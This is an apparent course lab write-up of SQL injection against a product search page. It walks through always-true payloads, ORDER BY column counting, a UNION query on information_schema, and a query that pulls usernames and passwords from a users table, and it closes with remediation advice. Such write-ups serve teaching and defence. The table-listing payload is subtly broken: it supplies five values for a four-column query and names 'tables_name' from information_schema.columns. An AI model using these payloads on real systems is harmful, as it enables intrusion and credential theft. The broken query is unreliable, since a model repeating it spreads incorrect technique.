# 0x03 Injection: SQL Injection (C295)

**Programme:** C295
**Category:** Web exploitation, SQL injection
**Tools:** Web browser, manual payloads

> Performed in a sandboxed course lab for educational purposes.

## Goal
Test a product search page for SQL injection, then enumerate the database until the flag is found.

## Walkthrough

### 1. Confirming the injection
I tested the input box with a classic always-true payload:

```sql
' or 1 = 1 #
```

Instead of returning only the "senpai knife set" I searched for, the page displayed **every item**. This showed the input was concatenated into the query without sanitisation.

### 2. Finding the number of columns with ORDER BY
To enumerate further, I used `ORDER BY`. It has to be sent together with the `' or 1=1` part, because without an always-true condition the query returns nothing and I get no useful response.

```sql
' or 1 = 1 order by 1 #
' or 1 = 1 order by 2 #
' or 1 = 1 order by 3 #
' or 1 = 1 order by 4 #
' or 1 = 1 order by 5 #
```

The first four worked normally. On `order by 5` the page replied **"no items found"**, so the query returns **4 columns**.

### 3. UNION attack to list tables
The sudden "no items found" told me I had passed the last column, so I moved to a more detailed `UNION` attack. I padded with `null` to match the 4 columns and read table names from `information_schema`:

```sql
' OR 1 = 1 UNION SELECT null,null,null,null,tables_name from information_schema.columns #
```

This listed the tables in the backend database, and I spotted an **`injection0x03_users`** table.

### 4. Extracting the credentials
```sql
' OR '1'='1' union select null,null,username,password from injection0x03_users #
```

This returned the usernames and passwords from the users table, which I believe contained the flag.

## Key takeaways
- A single quote and an always-true condition is a quick way to test for SQL injection.
- `ORDER BY n` reveals the number of columns, which you need before a `UNION SELECT` will work.
- `information_schema` lets an attacker map out the whole database once injection works.

## How this should be fixed (general guidance)
- Use **parameterised queries / prepared statements** instead of building SQL strings.
- Validate and escape user input, and apply allow-lists where possible.
- Give the application's database account **least privilege**, so it can't read `information_schema` or unrelated tables.
- Hash stored passwords and don't return raw credential columns to the page.
